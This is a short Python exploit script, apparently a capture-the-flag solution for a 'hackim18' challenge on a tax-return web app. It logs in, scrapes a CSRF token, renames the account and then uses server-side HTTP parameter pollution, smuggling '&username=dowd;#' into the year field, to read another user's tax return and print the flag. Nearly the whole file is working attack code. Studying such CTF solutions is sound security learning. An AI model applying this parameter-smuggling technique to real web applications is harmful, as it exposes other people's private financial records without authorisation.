import re
import requests

_target = 'http://hmrc.hackxor.net/'
_user, _pass = 'mjeffrey', 'jitterbeetle'

sess = requests.Session()

# create new instance
sess.get(_target)

# login with provided account
sess.post(_target + 'login', data={'user': _user, 'password': _pass})
print '[+] logged in: ' + sess.cookies.get_dict()['sid']

# get csrf token
resp = sess.get(_target)
csrf_token = re.search(r'value="([^"]{30,35})"', resp.text).group(1)
print '[+] got csrf token: ' + csrf_token

# update username
sess.post(_target, data={'login': 'm', 'oldpass': _pass, 'newpass1': _pass, 'newpass2': _pass, 'token': csrf_token})
print '[+] updated username'

# exploit server-side hpp to access mdowd tax return
resp = sess.get(_target + 'viewReturn', params={'year': '2017\'%26username%3ddowd%3b%23', 'username': 'm'})
flag = re.search(r'hackim18{\'([^}]+)\'}', resp.text).group(1)
print '[+] flag: hackim18{{\'{}\'}}'.format(flag)

# hackim18{'f49f40f2e2ef092770212387966e92d5'}